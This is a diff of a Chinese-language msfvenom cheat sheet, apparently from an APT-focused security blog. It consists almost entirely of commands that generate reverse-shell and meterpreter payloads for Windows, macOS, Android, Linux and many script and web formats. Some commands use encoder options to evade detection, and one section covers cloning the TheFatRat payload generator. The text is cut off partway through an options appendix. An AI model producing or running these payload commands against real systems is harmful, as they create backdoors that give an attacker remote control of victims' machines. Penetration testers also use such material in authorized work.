@@ -1,92 +1,111 @@
-专注APT攻击与防御
-https://micropoor.blogspot.com/
 
-**windows:**
-
-msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o payload.exe
-
-**mac:**
-
+### windows:
+```bash
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp 
+LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o payload.exe
+```
+### mac:
+```bash
 msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho
+``` 
 
-**android:**
+### android:
+```bash
 //需要签名
-
 msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk
+```
 
-**powershell:**
-
+### powershell:
+```bash
 msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
+```
 
-**linux:**
-
+### linux:
+```bash
 msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf
+```
 
-**php:**
-
+### php:
+```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+```
 
-**aspx:**
-
+### aspx:
+```bash
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx
-
-**jsp:**
-
+```
+### jsp:
+```bash
 msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.jsp
+```
 
-**war:**
-
+### war:
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw - o payload.war
+```
 
-**nodejs:**
-
+### nodejs:
+```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.js
+```
 
-**python:**
-
+### python:
+```bash
 msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.py
+```
 
-**perl:**
-
+### perl:
+```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.pl
-
-**ruby:**
-
+```
+### ruby:
+```bash
 msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.rb
+```
 
-**lua:**
-
+### lua:
+```bash
 msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.lua
+```
 
-**windows shellcode:**
-
+### windows shellcode:
+```bash
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c
+```
 
-**linux shellcode:**
-
+### linux shellcode:
+```bash
 msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c
+```
 
-**mac shellcode:**
-
+### mac shellcode:
+```bash
 msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c
+```
 
-**便捷化payload生成：**
+### 便捷化payload生成：
 
 项目地址：
 https://github.com/Screetsec/TheFatRat
 
-`root@John:~/Desktop# git clone https://github.com/Screetsec/TheFatRat.git`
+```bash
+root@John:~/Desktop# git clone https://github.com/Screetsec/TheFatRat.git
 //设置时需要挂墙
-![](media/492800d0d4d9ed8b762c3494bc845363.jpg)
-![](media/6eeb8e3d9370ca202dd0b45abe2e8756.jpg)
-![](media/a43ce02f6b76b5f01b8697c215bad11d.jpg)
-![](media/58459088b75ecdcc093e435a5a586638.jpg)
+```  
+![](media/492800d0d4d9ed8b762c3494bc845363.jpg)  
 
-**附录：**
+![](media/6eeb8e3d9370ca202dd0b45abe2e8756.jpg)  
+
+![](media/a43ce02f6b76b5f01b8697c215bad11d.jpg)  
+
+![](media/58459088b75ecdcc093e435a5a586638.jpg)  
+
+
+### 附录：
 
 中文使用说明：
-```
+```bash
 Options:
 
 -p, --payload <payload> 使用指定的payload
